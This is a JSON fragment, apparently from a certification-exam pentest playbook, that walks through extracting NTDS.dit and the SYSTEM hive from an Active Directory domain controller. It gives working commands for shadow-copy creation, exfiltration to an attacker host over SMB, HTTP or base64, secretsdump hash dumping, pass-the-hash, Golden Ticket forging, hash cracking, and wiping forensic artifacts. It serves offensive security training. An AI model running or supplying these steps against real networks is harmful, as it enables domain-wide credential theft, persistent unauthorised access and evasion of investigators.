              "notes": "PREFERRED if vshadow.exe already uploaded. -nw (no-writers) = 5-10 second creation. -p (persistent) = required for file extraction. REQUIREMENT: vshadow.exe in current directory or PATH. Download: Windows SDK → Debugging Tools for Windows → vshadow.exe (x64/x86). Upload via: SMB, HTTP, certutil, RDP. ADVANTAGE: Speed. DISADVANTAGE: Tool upload creates IOC (file transfer logs, AV scan, disk artifact). certification: Upload during initial post-exploitation, reuse across multiple targets.",
              "time_estimate": "5-10 seconds creation",
              "related_commands": [
                "ad-vshadow-create-shadow"
              ]
            },
            {
              "method": "Method B: vssadmin (Native, No Upload)",
              "commands": [
                "vssadmin create shadow /for=C:"
              ],
              "notes": "RECOMMENDED for certification exam. Native Windows utility (no upload needed). Creation slower (30-60 seconds) because writers enabled (cannot disable with vssadmin). ADVANTAGE: Zero upload, LOLBAS approach, works on all Windows Server. DISADVANTAGE: Slower creation (acceptable trade-off for zero dependencies). EXAM TIP: This is PRIMARY method - master this first, others are alternatives/enhancements.",
              "time_estimate": "30-60 seconds creation",
              "related_commands": [
                "ad-vssadmin-create-shadow"
              ]
            },
            {
              "method": "Method C: diskshadow (Scriptable, Advanced)",
              "commands": [
                "diskshadow /s C:\\Temp\\script.txt"
              ],
              "notes": "Advanced method for automation/scripting. Script content: 'set context persistent nowriters' + 'add volume C:' + 'create'. Can expose shadow as drive letter (expose %vssc% Z:) for simplified access. ADVANTAGE: Scriptable, reusable, drive letter mounting. DISADVANTAGE: More complex setup (script file creation). USE CASE: Multiple DCs, repeated operations, or when \\\\?\\GLOBALROOT paths causing errors (expose simplifies to Z:\\path).",
              "time_estimate": "10-30 seconds creation",
              "related_commands": [
                "ad-diskshadow-create-shadow"
              ]
            },
            {
              "method": "Method D: wmic (Legacy, Deprecated)",
              "commands": [
                "wmic shadowcopy call create Volume=C:\\\\"
              ],
              "notes": "LEGACY method for Windows 7/Server 2012/2016 (pre-wmic deprecation). NOT available on Windows 10 21H1+, Server 2022+. USE ONLY: Older lab machines where vssadmin/diskshadow blocked but wmic works. certification: Low priority (modern labs use current Windows versions). Syntax critical: Volume=C:\\\\ (trailing backslash required). Alternative: PowerShell WMI: (Get-WmiObject -List Win32_ShadowCopy).Create('C:\\\\','ClientAccessible')",
              "time_estimate": "5-10 seconds creation",
              "related_commands": [
                "ad-wmic-create-shadow"
              ]
            }
          ],
          "notes": "METHOD SELECTION DECISION TREE: (1) Have vshadow.exe uploaded + time-critical → Method A. (2) No uploads allowed/desired + standard scenario → Method B (RECOMMENDED). (3) Multiple DCs or path complexity issues → Method C. (4) Legacy Windows version + other methods unavailable → Method D. After shadow creation, ALWAYS verify success: vssadmin list shadows (should show new entry with recent Creation Time). Note shadow copy device number from output (HarddiskVolumeShadowCopyN where N is number - needed for next phase)."
        },
        {
          "phase": "Phase 3: NTDS.dit Extraction",
          "description": "Copy Active Directory database from shadow copy snapshot to accessible location on DC filesystem. Shadow copy path uses Windows object namespace (\\\\?\\GLOBALROOT\\Device\\...) to access snapshot volume.",
          "steps": [
            {
              "step": "3.1 Identify Shadow Copy Device Path",
              "commands": [
                "vssadmin list shadows"
              ],
              "output": "Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2 (note the number 2)",
              "notes": "Each shadow copy assigned unique device path with incremental number: HarddiskVolumeShadowCopy1 (first shadow), HarddiskVolumeShadowCopy2 (second), etc. Number persists until shadow deleted (reboot doesn't reset). IDENTIFY CORRECT SHADOW: Most recent Creation Time = highest number (usually). EXAM TIP: Copy exact path from vssadmin output to avoid typos (long, complex path). Alternative if diskshadow expose used: Device path is drive letter (Z:), skip to simplified copy.",
              "time_estimate": "5 seconds",
              "related_commands": [
                "ad-vssadmin-list-shadows"
              ]
            },
            {
              "step": "3.2 Copy NTDS.dit from Shadow Copy",
              "commands": [
                "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit.bak"
              ],
              "output": "1 file(s) copied.",
              "notes": "CRITICAL COMMAND - extracts AD database. Path breakdown: (1) \\\\?\\ = Win32 file namespace prefix (bypasses path parsing limits). (2) GLOBALROOT = NT kernel object namespace. (3) Device\\HarddiskVolumeShadowCopyN = shadow copy device. (4) \\Windows\\NTDS\\ntds.dit = path within snapshot. Output path: Use C:\\Temp, C:\\Windows\\Temp, or C:\\Users\\Public (writable locations). .bak extension = convention (distinguishes from live ntds.dit). Copy time: 5-30 seconds (depends on file size 20-500+ MB). VERIFICATION: dir C:\\Temp\\ntds.dit.bak (file size should match live database or be 20+ MB minimum). If 0 bytes or missing: Copy failed (verify path, shadow number, permissions).",
              "time_estimate": "5-30 seconds",
              "related_commands": [
                "ad-copy-ntds-from-shadow"
              ]
            },
            {
              "step": "3.3 Verify NTDS.dit Integrity",
              "commands": [
                "dir C:\\Temp\\ntds.dit.bak",
                "certutil -hashfile C:\\Temp\\ntds.dit.bak MD5"
              ],
              "output": "File size 20+ MB, hash value shown (for verification after transfer)",
              "notes": "Post-extraction validation prevents transfer/parsing failures later. CHECKS: (1) File size >20 MB (minimum viable NTDS.dit size, even small domains). (2) File exists and readable (dir shows attributes, timestamp). (3) Hash calculated for transfer verification (compare hash on Kali after transfer confirms no corruption). FILE SIZE REFERENCE: Small domain (100-500 users) = 20-50 MB. Medium (500-5000 users) = 50-200 MB. Large (5000+ users) = 200-500+ MB. Enterprise (50k+ users) = 1-5+ GB. If size suspicious: Re-extract or verify source path correct. EXAM TIP: Note file size for comparison after transfer (should match exactly).",
              "time_estimate": "5 seconds",
              "related_commands": []
            }
          ]
        },
        {
          "phase": "Phase 4: SYSTEM Hive Extraction",
          "description": "Export SYSTEM registry hive containing boot key (syskey) required to decrypt NTDS.dit credentials. Boot key encrypts Password Encryption Key (PEK) in NTDS.dit - without SYSTEM hive, secretsdump cannot decrypt any hashes.",
          "steps": [
            {
              "step": "4.1 Save SYSTEM Registry Hive",
              "commands": [
                "reg save HKLM\\SYSTEM C:\\Temp\\system.bak"
              ],
              "output": "The operation completed successfully.",
              "notes": "MANDATORY step - NTDS.dit alone is useless without boot key from SYSTEM hive. Registry path: HKLM\\SYSTEM (NOT HKEY_LOCAL_MACHINE\\SYSTEM - reg save uses abbreviated format). Output same directory as NTDS.dit for easy transfer. .bak extension = convention (prevents confusion with live registry). File size: ~8-15 MB typical. VERIFICATION: dir C:\\Temp\\system.bak (if <1 MB, export failed). Common error: 'Access denied' = need Administrator or SeBackupPrivilege enabled. ALTERNATIVE: reg export HKLM\\SYSTEM system.reg creates TEXT .reg file (NOT compatible with secretsdump - must use 'reg save' for binary format). EXAM TIP: Run immediately after copying NTDS.dit (easy to forget, blocks credential extraction later).",
              "time_estimate": "3-10 seconds",
              "related_commands": [
                "ad-reg-save-system-hive"
              ]
            },
            {
              "step": "4.2 Verify SYSTEM Hive Integrity",
              "commands": [
                "dir C:\\Temp\\system.bak",
                "file C:\\Temp\\system.bak (on Kali after transfer)"
              ],
              "output": "File size 8-15 MB, 'MS Windows registry file' (Kali file command)",
              "notes": "Validate SYSTEM hive before transfer. CHECKS: (1) File size 8-15 MB range (too small = export failed, too large = wrong file). (2) File timestamp matches NTDS.dit timestamp (both extracted in same session = consistent). On Kali after transfer: file system.bak should show 'MS Windows registry file, NT/2000 or above' (confirms proper binary format). If shows ASCII or other format: Used 'reg export' instead of 'reg save', re-extract with correct command. CRITICAL: SYSTEM hive must match NTDS.dit source (same machine, same time). Using SYSTEM from different DC or restore point = boot key mismatch = decryption failure.",
              "time_estimate": "5 seconds",
              "related_commands": []
            }
          ]
        },
        {
          "phase": "Phase 5: File Transfer to Kali",
          "description": "Exfiltrate NTDS.dit and SYSTEM hive from DC to Kali attack machine for offline parsing. Transfer method selection based on: network connectivity, firewall rules, AV/EDR presence, and OPSEC requirements.",
          "methods": [
            {
              "method": "Method 1: SMB Share (impacket-smbserver)",
              "commands": [
                "# Kali: impacket-smbserver share /tmp/loot -smb2support -username kali -password kali",
                "# DC: net use \\\\<KALI_IP>\\share /user:kali kali",
                "# DC: copy C:\\Temp\\*.bak \\\\<KALI_IP>\\share\\"
              ],
              "notes": "FASTEST method for local network (exam labs typically allow). Setup: (1) Kali: Start SMB server with impacket-smbserver on /tmp/loot. -smb2support = SMBv2/v3 compatibility (Server 2012+ requires SMB2). Authentication: -username/-password prevents anonymous access errors. (2) DC: Mount share with 'net use' (authenticates), copy files. ADVANTAGES: Fast (network speed limited), reliable, bidirectional (can upload/download). DISADVANTAGES: SMB traffic (port 445) blocked in some environments, firewall rules may prevent, logged in network monitoring. TROUBLESHOOTING: 'System error 1240' = SMB signing mismatch. ADD to impacket-smbserver: -smb2support. 'Access denied' = authentication failure, verify username/password. 'Network path not found' = firewall blocking 445, IP typo, or impacket-smbserver not running.",
              "time_estimate": "30-120 seconds transfer",
              "related_commands": []
            },
            {
              "method": "Method 2: Python HTTP Server",
              "commands": [
                "# DC: certutil -urlcache -split -f http://<KALI_IP>:8080/download.txt download.txt (verify connectivity)",
                "# Kali: python3 -m http.server 8080",
                "# DC: certutil -urlcache -split -f http://<KALI_IP>:8080/ (browse files)",
                "# Kali: Use reverse connection - DC uploads to Kali (requires POST handler OR use uploadserver)"
              ],
              "notes": "HTTP suitable when SMB blocked but web traffic allowed. DIRECTION ISSUE: Python http.server is download-only (GET requests) - DC can download FROM Kali but cannot upload TO Kali easily. WORKAROUND: Use uploadserver module: pip3 install uploadserver && python3 -m uploadserver 8080. DC uploads with: Invoke-WebRequest -Uri http://<KALI_IP>:8080/upload -Method POST -InFile C:\\Temp\\ntds.dit.bak (PowerShell). ALTERNATIVE: Base64 encode on DC, transfer as text: certutil -encode ntds.dit.bak ntds.txt, copy-paste text to Kali file, certutil -decode ntds.txt ntds.dit.bak (Kali with certutil via wine). ADVANTAGES: HTTP common/allowed, harder to block. DISADVANTAGES: Slower than SMB, requires encoding for binary files (base64 = 33% size increase), more complex setup.",
              "time_estimate": "2-5 minutes transfer + encoding",
              "related_commands": []
            },
            {
              "method": "Method 3: RDP Clipboard Transfer",
              "commands": [
                "# Enable clipboard redirection in RDP client",
                "# DC: Copy file to clipboard (small files only, <100 MB)",
                "# Kali: Paste in remote desktop session or use shared folder"
              ],
              "notes": "RDP clipboard sharing allows file transfer via copy-paste. SETUP: RDP client: Enable 'Clipboard' in Local Resources → More → Clipboard (checked). OR use shared folders: Local Resources → More → Drives → Select Kali drive. PROCEDURE: (1) Clipboard: Copy file in DC Explorer, paste in Kali (slow for large files). (2) Shared folders: DC can access Kali drives as \\\\tsclient\\<drive>\\path. LIMITATIONS: Slow (clipboard transfer 1-5 MB/sec typical), unreliable for >100 MB files (clipboard buffer limits), requires RDP GUI (not SSH). ADVANTAGES: Works when network file transfer blocked (firewall allows RDP port 3389 only), simple for small files. certification USE CASE: Backup method when SMB/HTTP fail, or quick transfer of small files (SYSTEM hive 10 MB = suitable, NTDS.dit 500 MB = too slow).",
              "time_estimate": "1-10 minutes (size dependent)",
              "related_commands": []
            },
            {
              "method": "Method 4: Base64 Encoding (Universal)",
              "commands": [
                "# DC: certutil -encode ntds.dit.bak ntds.txt",
                "# DC: type ntds.txt (copy text to Kali)",
                "# Kali: paste text to file ntds.txt",
                "# Kali: base64 -d ntds.txt > ntds.dit.bak"
              ],
              "notes": "Base64 encoding converts binary to ASCII text (safe for copy-paste, text-based transfers). PROCEDURE: (1) DC: certutil -encode <file.bak> <file.txt> (creates base64 text file). (2) Transfer text: Copy-paste via RDP clipboard, terminal output copy, web form, etc. (3) Kali: base64 -d <file.txt> > <file.bak> (decode back to binary). ADVANTAGES: Universal (works with any text transfer method), firewall-proof (no network ports needed, can paste via web interfaces), reliable for small-medium files. DISADVANTAGES: 33% size increase (100 MB binary = 133 MB text), slow for large files (manual copy-paste), easy to corrupt (missing characters = decode failure). VERIFICATION CRITICAL: Compare MD5/SHA256 hashes before/after: certutil -hashfile ntds.dit.bak MD5 (DC), md5sum ntds.dit.bak (Kali) - must match exactly. EXAM USE CASE: Last resort when all network transfer methods blocked, or quick transfer of SYSTEM hive only (10 MB text = manageable copy-paste).",
              "time_estimate": "5-15 minutes (manual copy-paste)",
              "related_commands": []
            }
          ],
          "notes": "TRANSFER METHOD SELECTION: (1) certification exam standard: Try SMB (impacket-smbserver) first - fastest and most reliable. (2) SMB blocked: Python HTTP with uploadserver OR base64 encoding. (3) Network transfer impossible: RDP clipboard. INTEGRITY VERIFICATION MANDATORY: Compare file sizes (dir on DC vs ls -lh on Kali - must match exactly). Check hashes (certutil vs md5sum/sha256sum). Corrupted transfer = secretsdump failure later. CLEANUP ON DC: After SUCCESSFUL transfer verification, delete files: del C:\\Temp\\ntds.dit.bak C:\\Temp\\system.bak /F /Q (forensic artifact removal). Do NOT delete before confirming Kali files valid (may need re-transfer if corruption detected)."
        },
        {
          "phase": "Phase 6: Offline Credential Parsing on Kali",
          "description": "Extract Active Directory credentials from NTDS.dit using Impacket's secretsdump tool in offline LOCAL mode. Parses database to obtain NTLM hashes, Kerberos keys, and cleartext passwords (if reversible encryption enabled).",
          "steps": [
            {
              "step": "6.1 Verify File Transfer Integrity",
              "commands": [
                "ls -lh ntds.dit.bak system.bak",
                "file ntds.dit.bak system.bak",
                "md5sum ntds.dit.bak system.bak"
              ],
              "output": "ntds.dit.bak: 20+ MB, 'Extensible storage engine' OR 'MS ESE database'. system.bak: 8-15 MB, 'MS Windows registry file'",
              "notes": "PRE-PARSING VALIDATION prevents wasted time on corrupted files. CHECKS: (1) File sizes match DC source (compare with dir output from DC). (2) File types correct: 'file' command shows NTDS.dit = ESE database, SYSTEM = Windows registry. (3) Hash verification: md5sum/sha256sum matches certutil output from DC (if calculated). COMMON ISSUES: (1) Zero byte files = transfer failed completely. (2) Text files when expecting binary = used wrong transfer method (reg export instead of reg save, or base64 not decoded). (3) Size mismatch = partial transfer, corruption, or wrong file. FIX: Re-transfer files, verify transfer method correctness, check network stability.",
              "time_estimate": "10 seconds",
              "related_commands": []
            },
            {
              "step": "6.2 Run impacket-secretsdump in LOCAL Mode",
              "commands": [
                "impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL",
                "impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee credentials.txt"
              ],
              "output": "[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 98d2b28135d3e0d...\n[*] Reading and decrypting hashes from ntds.dit.bak\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::\nkrbtgt:502:...:1693c6cefafffc7af11ef34d1c788f47:::",
              "notes": "SECRETSDUMP PROCESS: (1) Extract boot key from SYSTEM hive (shown in output: 'bootKey: 0x...'). (2) Decrypt PEK (Password Encryption Keys List) from NTDS.dit using boot key (shown: 'PEK # 0 found and decrypted'). (3) Enumerate user objects in NTDS.dit database. (4) Decrypt each user's NTLM hash and Kerberos keys using PEK. OUTPUT FORMAT: domain\\username:RID:LMhash:NThash::: Example: CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: Field 4 (after third colon) = NTLM hash (32 hex characters). Field 3 = LM hash (usually aad3b435b51404eeaad3b435b51404ee = empty LM, deprecated). Use 'tee credentials.txt' to save output while displaying (allows scrollback review + file for later reference). TIME: 10-60 seconds (depends on domain size - 100 users = 10 sec, 10000 users = 60 sec).",
              "time_estimate": "10-60 seconds",
              "related_commands": [
                "ad-secretsdump-parse-ntds"
              ]
            },
            {
              "step": "6.3 Extract Critical Credentials",
              "commands": [
                "grep -i administrator credentials.txt",
                "grep -i krbtgt credentials.txt",
                "grep -E '^[^$:]+:' credentials.txt | grep -v '\\$:' (filter out machine accounts)"
              ],
              "output": "Administrator:500:...:2892d26cdf84d7a70e2eb3b9f05c425e:::\nkrbtgt:502:...:1693c6cdf84d7a70e2eb3b9f05c425e:::",
              "notes": "PRIORITY CREDENTIALS: (1) Administrator (RID 500) = built-in domain admin, highest privileges. (2) krbtgt (RID 502) = Kerberos Ticket Granting Ticket account, used for Golden Ticket attacks. (3) Domain Admins group members = high-value targets. (4) Service accounts (e.g., iis_service, sql_svc) = often have weak passwords, lateral movement targets. MACHINE ACCOUNTS: End with $ (DC1$, WEB04$, FILES04$) = computer accounts, usually not crackable (120-character random passwords), less useful. FILTER machine accounts: grep -v '\\$:' removes lines with $ before first colon. KERBEROS KEYS: After NTLM hash section, secretsdump outputs Kerberos keys (aes256-cts-hmac-sha1-96, aes128-cts-hmac-sha1-96, des-cbc-md5). AES256 keys preferred for Kerberos attacks (Golden Ticket, Silver Ticket, Overpass-the-Hash).",
              "time_estimate": "30-60 seconds analysis",
              "related_commands": []
            },
            {
              "step": "6.4 Parse and Store Credentials",
              "commands": [
                "# Extract NTLM hashes only:\ncat credentials.txt | grep -E '^[^$:]+:' | grep -v '\\$:' | cut -d: -f4 > ntlm_hashes.txt",
                "# Extract krbtgt hash:\ngrep krbtgt credentials.txt | cut -d: -f4 > krbtgt_hash.txt",
                "# Create hash:username file for cracking:\ncat credentials.txt | grep -E '^[^:]+:[0-9]+:[a-f0-9]{32}:[a-f0-9]{32}' | awk -F: '{print $4\":\"$1}' > hashcat_format.txt"
              ],
              "output": "ntlm_hashes.txt: List of 32-character hex NTLM hashes. krbtgt_hash.txt: Single krbtgt hash. hashcat_format.txt: hash:username format for Hashcat",
              "notes": "CREDENTIAL STORAGE FORMATS: (1) NTLM hashes only (ntlm_hashes.txt) = for Pass-the-Hash with crackmapexec, psexec, evil-winrm. (2) krbtgt hash isolated = for Golden Ticket creation (ticketer.py, mimikatz). (3) Hashcat format (hash:username) = for offline cracking with hashcat -m 1000 (NTLM mode). HASH VALIDATION: NTLM hash = 32 hex characters (0-9a-f). LM hash (usually empty) = aad3b435b51404eeaad3b435b51404ee (constant for empty LM). Empty NTLM = 31d6cfe0d16ae931b73c59d7e0c089c0 (blank password - immediate win). USERNAME PARSING: Username is field 1 (before first colon), format domain\\user. For tool compatibility, may need to strip domain: cut -d\\\\ -f2 (removes CORP\\ prefix, leaves just user).",
              "time_estimate": "1-2 minutes parsing",
              "related_commands": []
            }
          ]
        },
        {
          "phase": "Phase 7: Credential Usage and Cleanup",
          "description": "Utilize extracted credentials for lateral movement, privilege escalation, and persistence. Clean up forensic artifacts on DC to reduce detection surface.",
          "steps": [
            {
              "step": "7.1 Pass-the-Hash with NTLM Hashes",
              "commands": [
                "crackmapexec smb <TARGET_IP> -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e",
                "impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e administrator@<TARGET_IP>",
                "evil-winrm -i <TARGET_IP> -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e"
              ],
              "output": "Pwn3d! (crackmapexec) OR shell prompt (psexec/evil-winrm)",
              "notes": "NTLM HASH USAGE: Pass-the-Hash (PtH) leverages NTLM hash directly for authentication without cracking. NTLM hash = password equivalent for Windows authentication (challenge-response protocol). TOOLS: (1) crackmapexec = quick validation (tests hash against multiple targets, shows 'Pwn3d!' for admin access). (2) impacket-psexec = remote shell via SMB (exec service). (3) evil-winrm = PowerShell remoting (requires WinRM enabled, port 5985/5986). SYNTAX: -hashes :NThash (colon prefix, empty LM hash implied) OR -hashes LM:NT (if LM hash needed). TARGETS: Use Administrator hash against all domain machines (local admin on domain-joined), use user-specific hashes for their access level. certification: PtH to lateral movement across network, capture flags on multiple machines with single credential set.",
              "time_estimate": "10-30 seconds per target",
              "related_commands": []
            },
            {
              "step": "7.2 Golden Ticket Creation with krbtgt Hash",
              "commands": [
                "# Extract Domain SID:\nlookupsid.py <domain>/<user>:<password>@<DC_IP> | grep 'Domain SID'",
                "# Create Golden Ticket:\nimpacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com administrator",
                "# Use ticket:\nexport KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass administrator@dc1.corp.com"
              ],
              "output": "Golden Ticket saved to administrator.ccache, authenticated shell on DC",
              "notes": "GOLDEN TICKET: Forged Kerberos TGT (Ticket Granting Ticket) using krbtgt hash. krbtgt account password encrypts ALL TGTs - with hash, can create valid TGT for ANY user (including non-existent users) with ANY privileges. REQUIREMENTS: (1) krbtgt NTLM hash (from NTDS.dit extraction). (2) Domain SID (use lookupsid.py, whoami /user, or Get-DomainSID). (3) Domain FQDN (corp.com). PERSISTENCE: krbtgt password NEVER changes automatically (only during functional level upgrade or manual reset). Golden Ticket valid for YEARS until krbtgt hash changed. USAGE: Set KRB5CCNAME environment variable to ticket path, use Kerberos authentication (-k flag) with impacket tools. OPSEC: Extremely stealthy - no password validation (offline ticket creation), no network traffic to DC until ticket used. certification: Ultimate persistence, re-access domain even after initial account disabled/password changed.",
              "time_estimate": "2-3 minutes",
              "related_commands": []
            },
            {
              "step": "7.3 Offline Hash Cracking",
              "commands": [
                "hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt",
                "hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
              ],
              "output": "Cracked passwords displayed with hash:plaintext format",
              "notes": "OFFLINE CRACKING: Convert NTLM hashes to plaintext passwords using hashcat (GPU) or john (CPU). MODE 1000 = NTLM hash. STRATEGY: (1) Straight dictionary: rockyou.txt (14M passwords, <1 min on GPU for weak passwords). (2) Rules-based: best64.rule (variations like P@ssw0rd, passw0rd123). (3) Mask attack: hashcat -a 3 -m 1000 hashes.txt ?u?l?l?l?l?d?d?d?d (8-char: Uppercase+4 lowercase+4 digits). SUCCESS RATE: 20-40% of domain passwords crackable with rockyou + rules (weak passwords common). HIGH-VALUE TARGETS: Service accounts (sql_svc, backup_admin) often have static, crackable passwords. certification USAGE: Plaintext passwords enable RDP, SSH, web application login (more versatile than hash-only PtH). TIME: rockyou straight = 1-5 min. Rules-based = 10-30 min. Mask attacks = hours-days (exam time limited, focus on quick wins).",
              "time_estimate": "1-60 minutes (variable)",
              "related_commands": []
            },
            {
              "step": "7.4 Cleanup Shadow Copies on DC",
              "commands": [
                "vssadmin delete shadows /for=C: /all /quiet"
              ],
              "output": "Successfully deleted X shadow copies",
              "notes": "OPSEC CLEANUP: Delete shadow copies to remove forensic evidence of extraction. Event 8224 logged (shadow deleted) but removes snapshot itself. TIMING: Cleanup AFTER credentials verified on Kali and files transferred successfully (don't delete prematurely, may need re-extraction). ALTERNATIVES: (1) Delete specific shadow: vssadmin delete shadows /shadow={ShadowID} /quiet (preserve other shadows). (2) Delete oldest only: /oldest (keep recent legitimate backups). (3) Leave shadows if OPSEC not critical (exam: cleanup recommended but not mandatory for points). FORENSIC IMPACT: Deletion removes shadow copy but NOT Event 8222 (creation log), Event 4663 (file access log), or transferred file artifacts. Full cleanup requires: (1) Shadow deletion. (2) Event log clearing (risky, obvious). (3) File deletion on DC (del *.bak). (4) Network transfer log removal (if SMB/HTTP logged).",
              "time_estimate": "5-10 seconds",
              "related_commands": [
                "ad-vssadmin-delete-shadows"
              ]
            },
            {
              "step": "7.5 Delete Extracted Files on DC",
              "commands": [
                "del C:\\Temp\\ntds.dit.bak C:\\Temp\\system.bak /F /Q",
                "del C:\\Windows\\Temp\\meta.cab /F /Q (if diskshadow used)",
                "# Optional: Secure delete with sdelete:\nsdelete64.exe -p 3 C:\\Temp\\ntds.dit.bak"
              ],
              "output": "Files deleted silently (/Q = quiet, no prompts)",
              "notes": "FILE CLEANUP: Remove extracted NTDS.dit and SYSTEM hive from DC to eliminate forensic artifacts. /F = force delete (even read-only files). /Q = quiet (no confirmation prompts). LOCATIONS TO CHECK: (1) C:\\Temp\\*.bak. (2) C:\\Windows\\Temp\\*.bak. (3) C:\\Users\\<username>\\Desktop (if saved to desktop). (4) Metadata files: meta.cab (diskshadow). SECURE DELETE: Standard 'del' marks file as deleted but data recoverable with forensics. sdelete (SysInternals) overwrites file data before deletion: sdelete64 -p 3 <file> (3-pass overwrite). EXAM CONSIDERATION: Standard 'del' sufficient for certification (no forensic recovery simulation). Real-world: Use sdelete or shred for sensitive operations. VERIFICATION: dir C:\\Temp (should NOT show deleted files). If files remain: Check permissions, close open handles (handle.exe from SysInternals), try /F flag.",
              "time_estimate": "5-10 seconds",
              "related_commands": []
            },
            {
              "step": "7.6 Secure Credential Storage on Kali",
              "commands": [
                "# Encrypt credentials:\ngpg -c credentials.txt (creates credentials.txt.gpg, enter passphrase)",
                "# Delete plaintext:\nshred -vfz credentials.txt ntds.dit.bak system.bak",
                "# Store securely:\nmv credentials.txt.gpg ~/loot/<target>_domain_creds_$(date +%Y%m%d).gpg"
              ],
              "output": "Encrypted credentials.txt.gpg created, plaintext files securely deleted",
              "notes": "CREDENTIAL SECURITY ON KALI: Domain credentials are HIGH-VALUE data - protect from theft/leakage. ENCRYPTION: gpg -c (symmetric encryption) with strong passphrase. Prevents credential exposure if Kali VM compromised or exported. SECURE DELETE: shred -vfz (overwrite, verbose, force, zero-fill) prevents recovery from disk. Standard 'rm' leaves data recoverable. ORGANIZATION: Store encrypted credentials in organized structure: ~/loot/<target_name>_domain_creds_YYYYMMDD.gpg (date-stamped for report correlation). EXAM WORKFLOW: Encrypt credentials during exam, decrypt post-exam for report writing. DECRYPTION: gpg credentials.txt.gpg (prompts for passphrase, outputs plaintext). BACKUP: Keep credentials.txt.gpg backed up (report requirement, re-testing), delete decrypted plaintext after use. COMPLIANCE: Professional engagements require encryption at rest for credentials (PCI-DSS, SOC 2). Practice in certification builds good habits.",
              "time_estimate": "30 seconds",
              "related_commands": []
            }
          ]
        }
      ],
      "common_issues": {
        "Access is denied during shadow copy creation": {
          "cause": "Insufficient privileges - requires Administrator OR SeBackupPrivilege enabled",
          "solution": "VERIFY: whoami /groups | findstr Administrators (should show local Administrators group). Check UAC elevation: whoami /groups | findstr 'High Mandatory Level' (elevated prompt required). If not elevated: Right-click cmd.exe → Run as administrator OR runas /user:Administrator cmd. ALTERNATIVE: Use Backup Operators group with SeBackupPrivilege: whoami /priv | findstr Backup. If privilege shown but disabled: Enable with PowerShell: Enable-ProcessPrivilege SeBackupPrivilege (requires script from RSAT tools).",
          "prevention": "Always verify privileged access BEFORE attempting shadow operations. Run initial enumeration: whoami /all (shows all privileges and groups). If Domain Admin: Automatically have local Administrator on DCs. If non-DA: Verify specific Administrator rights or Backup Operators membership."
        },
        "The system cannot find the file specified (NTDS.dit copy)": {
          "cause": "Incorrect shadow copy device path OR wrong shadow copy number OR custom NTDS.dit location",
          "solution": "STEP 1: Verify shadow copy exists: vssadmin list shadows (should show recent shadow with device name). STEP 2: Copy EXACT device path from output (including number): \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2. STEP 3: Test shadow access: dir \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\ (should list C: drive root). STEP 4: Verify NTDS.dit path: Default is \\Windows\\NTDS\\ntds.dit. If custom: Check registry: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \"DSA Database file\". STEP 5: Combine correct device + correct path: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\<NTDS_path> C:\\Temp\\ntds.dit.bak",
          "prevention": "ALWAYS run vssadmin list shadows after creation, copy device path from output (don't type manually - high typo risk with long complex path). ALWAYS verify NTDS.dit location BEFORE shadow creation (Phase 1 prerequisite check). NOTE shadow copy number increments (if 2 shadows exist, next is number 3)."
        },
        "secretsdump error: Unable to open NTDS database": {
          "cause": "NTDS.dit file corrupted during transfer OR wrong file type OR incomplete transfer",
          "solution": "VERIFY FILE INTEGRITY: (1) Check file size: ls -lh ntds.dit.bak (compare with DC: dir C:\\Temp\\ntds.dit.bak - must match exactly). (2) Check file type: file ntds.dit.bak (should show 'Extensible storage engine' or 'MS ESE database'). If shows ASCII/text: Wrong file or base64 not decoded. (3) Compare hashes: md5sum ntds.dit.bak (Kali) vs certutil -hashfile ntds.dit.bak MD5 (DC) - must match. CORRUPTION FIX: Re-transfer file using different method (if SMB failed, try HTTP or base64). Verify transfer integrity at each step. TEST PARTIAL: If large file (500+ MB), try chunked transfer or compression (zip on DC, transfer zip, unzip on Kali).",
          "prevention": "ALWAYS verify file integrity immediately after transfer (before proceeding to secretsdump). Calculate and compare hashes (MD5 or SHA256) between source and destination. Use reliable transfer method (impacket-smbserver most reliable in labs). For large files: Test transfer with small file first (system.bak ~10 MB), then transfer large NTDS.dit."
        },
        "secretsdump error: SYSTEM hive not found OR boot key error": {
          "cause": "SYSTEM hive path incorrect OR file not transferred OR SYSTEM hive doesn't match NTDS.dit source",
          "solution": "CHECK FILE PRESENCE: ls -lh system.bak (verify file exists, 8-15 MB size). VERIFY FILE TYPE: file system.bak (should show 'MS Windows registry file, NT/2000 or above'). If wrong type: Used 'reg export' instead of 'reg save' - re-extract with correct command: reg save HKLM\\SYSTEM system.bak. MISMATCH ERROR: If 'PEK decryption failed' or 'boot key error': SYSTEM hive from different machine or different time than NTDS.dit. Boot key mismatch prevents PEK decryption. FIX: Re-extract BOTH files from SAME shadow copy in SAME session on SAME DC. Transfer together, verify timestamps match.",
          "prevention": "ALWAYS extract NTDS.dit and SYSTEM hive together (immediately sequential: copy ntds.dit && reg save SYSTEM). NEVER mix NTDS.dit from one DC with SYSTEM hive from different DC (boot keys differ per installation). Verify both files have matching timestamps: ls -l (extracted within seconds of each other)."
        },
        "Insufficient storage available to create shadow copy": {
          "cause": "Disk space insufficient for shadow copy differential storage (VSS storage area full)",
